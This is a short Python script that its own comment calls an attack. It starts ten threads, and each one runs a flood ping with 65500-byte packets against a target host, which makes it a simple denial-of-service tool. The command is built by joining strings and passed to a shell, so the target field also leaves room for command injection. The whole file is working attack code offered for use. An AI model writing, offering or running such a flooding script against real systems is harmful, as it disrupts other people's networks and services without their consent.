import subprocess
import threading

# target of the attack
target = ""
# number of threads
num_threads = 10

def ping():
    command = "ping " + target + " -s 65500 -f"
    subprocess.call(command, shell=True)

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=ping)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
